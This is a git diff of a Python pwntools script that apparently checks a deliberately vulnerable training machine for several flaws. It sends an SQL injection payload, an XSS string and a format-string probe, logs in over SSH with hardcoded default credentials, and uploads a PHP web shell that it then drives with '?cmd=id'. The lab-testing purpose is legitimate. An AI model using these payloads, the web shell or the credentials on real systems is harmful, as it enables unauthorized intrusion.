@@ -2,6 +2,7 @@
 
 from pwn import *
 import re
+import requests
 
 class test_vulns():
     def test_cmd_injection(self, ip):
@@ -21,10 +22,10 @@ class test_vulns():
         log.debug(results)
         conn.close()
         if "jackbauer" in results:
-            log.info(ip+" VULNERABLE")
+            log.info(ip+" VULNERABLE to cmd injection")
             return True
         else:
-            log.info(ip+" NOT VULNERABLE")
+            log.info(ip+" NOT VULNERABLE cmd injection")
             return False
 
 
@@ -48,10 +49,10 @@ class test_vulns():
         conn.close()
         log.debug(results)
         if "-11" in results:
-            log.info(ip+" VULNERABLE")
+            log.info(ip+" VULNERABLE to buffer overflow")
             return True
         else:
-            log.info(ip+" NOT VULNERABLE")
+            log.info(ip+" NOT VULNERABLE to buffer overflow")
             return False
 
 
@@ -66,15 +67,15 @@ class test_vulns():
             results = ""
             results = shell["whoami"]
         except:
-            log.info("Failed to connect to " + ip)
+            log.info("Failed to connect to ssh " + ip)
             return False
         log.debug(results)
         shell.close()
         if username in results:
-            log.info(ip+" VULNERABLE")
+            log.info(ip+" VULNERABLE to default ssh "+ username)
             return True
         else:
-            log.info(ip+" NOT VULNERABLE")
+            log.info(ip+" NOT VULNERABLE to default ssh "+ username)
             return False
 
     def test_backdoor_1(self, ip):
@@ -93,7 +94,7 @@ class test_vulns():
                     results = conn.recv()
                     conn.close()
                 if "jackbauer" in results:
-                    log.info(ip+" VULNERABLE")
+                    log.info(ip+" VULNERABLE to backdoor 1")
                     return True
             except:
                 pass
@@ -108,14 +109,13 @@ class test_vulns():
         try:
             results = wget(url)
         except:
-            print("Error")
+            log.info("Error connecting to backdoor 2 " + ip)
             return False
-        print(results)
         if "www-data" in results:
-            log.info(ip+" VULNERABLE")
+            log.info(ip+" VULNERABLE to backdoor 2")
             return True
         else:
-            log.info(ip+" NOT VULNERABLE")
+            log.info(ip+" NOT VULNERABLE to backdoor 2")
             return False
 
     def test_lfi(self, ip):
@@ -130,12 +130,11 @@ class test_vulns():
         except:
             log.info("Error performing web request to ")
             return False
-        print(results)
         if "surnow" in results:
-            log.info(ip+" VULNERABLE")
+            log.info(ip+" VULNERABLE to lfi")
             return True
         else:
-            log.info(ip+" NOT VULNERABLE")
+            log.info(ip+" NOT VULNERABLE to lfi")
             return False
 
     def test_local_format_string(self, ip, username, pw):
@@ -149,18 +148,18 @@ class test_vulns():
         try:
             shell = ssh(username, ip, password=pw)
         except:
-            print("Failed to Connect")
+            log.info("Failed to connect to local format string "+ ip)
             return False
         results = ""
         results = shell["/home/jackbauer/services/c/formatme_local/printf %x%x%x"]
         evaluation = re.match("[0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f]", results)
-        print(results)
+        log.info(results)
         shell.close()
         if evaluation:
-            log.info(ip+" VULNERABLE")
+            log.info(ip+" VULNERABLE to local format string")
             return True
         else:
-            log.info(ip+" NOT VULNERABLE")
+            log.info(ip+" NOT VULNERABLE to local format string")
             return False
 
     def test_reflected_xss(self, ip):
@@ -173,21 +172,74 @@ class test_vulns():
         try:
             results = wget(url)
         except:
-            print("Error")
+            log.info("Error reflected XSS " + ip)
             return False
-        print(results)
+        log.info(results)
         if "<img src=x onerror=alert(1)>" in results:
-            log.info(ip+" VULNERABLE")
+            log.info(ip+" VULNERABLE to reflected xss")
             return True
         else:
-            log.info(ip+" NOT VULNERABLE")
+            log.info(ip+" NOT VULNERABLE to reflected xss")
             return False
 
+    def test_sqli(self, ip):
+        """
+        Test for SQL injection (SQLi)
+        @param  ip: ip address of target
+        """
+        log.info("testing sqli on " + ip)
+        #payload = {'codename_input':'B-Rabbit', 'submitted':'TRUE'}
+        payload = {'codename_input':'a" or 2 LIKE 2-- ', 'submitted':'TRUE'}
+        url = "http://" + ip + "/index.php"
+        try:
+            results = requests.post(url, data=payload)
+            log.info(results.text)
+        except:
+            log.info("Failed to connect to sqli " + ip)
+            return False
+        if "Tibet" in results.text:
+            return True
+        else:
+            return False
+
+    def test_local_format_string_chloe(self, ip):
+        self.test_local_format_string(ip, "chloe", "chloechloe")
+
     def test_dom_based_xss(self, ip):
-        print("need to implement")
+        log.info("testing dom based xss")
+        url = "http://" + ip + "/dom_based_xss/index.html"
+        try:
+            results = wget(url)
+            log.info(results)
+        except:
+            log.info("Failed to connect to " + ip)
+        if 'document.write("<a href=" + decodeURIComponent(document.baseURI)' in results:
+            log.info(ip + " VULNERABLE to dom based XSS")
+            return True
+        else:
+            return False
 
     def test_arbitrary_file_upload(self, ip):
-        print("need to implement")
+        log.info("testing arbitrary file upload ")
+        url = "http://" + ip + "/arbitrary_file_upload/upload.php"
+        files = {'image': open('hacker_shell.php', 'rb')}
+        try:
+            results = requests.post(url, files=files)
+            log.info(results.text)
+        except:
+            return False
+        url2 = "http://" + ip + "/arbitrary_file_upload/images/hacker_shell.php?cmd=id"
+        try:
+            results2 = requests.get(url2)
+            log.info(results2.text)
+        except:
+            return False
+        if "www-data" in results2.text:
+            log.info(ip+" VULNERABLE to arbitrary file upload")
+            return True
+        else:
+            log.info(ip+" NOT VULNERABLE to arbitrary file upload")
+            return False
 
     def test_ssh_jackbauer(self, ip):
         return self.test_ssh_default(ip, "jackbauer", "devgru6")
@@ -203,8 +255,12 @@ class test_vulns():
 
 
 if __name__ == "__main__":
-    ip_addr = "192.168.0.30"
+    ip_addr = "192.168.3.117"
     t = test_vulns()
+    context.log_level = "info"
+    t.test_arbitrary_file_upload(ip_addr)
+    t.test_dom_based_xss(ip_addr)
+    t.test_sqli(ip_addr)
     t.test_cmd_injection(ip_addr)
     t.test_buffer_overflow(ip_addr)
     t.test_ssh_jackbauer(ip_addr)
@@ -212,7 +268,6 @@ if __name__ == "__main__":
     t.test_ssh_surnow(ip_addr)
     t.test_backdoor_1(ip_addr)
     t.test_lfi(ip_addr)
-    t.test_local_format_string(ip_addr, "chloe", "chloechloe")
+    t.test_local_format_string_chloe(ip_addr)
     t.test_reflected_xss(ip_addr)
-
 
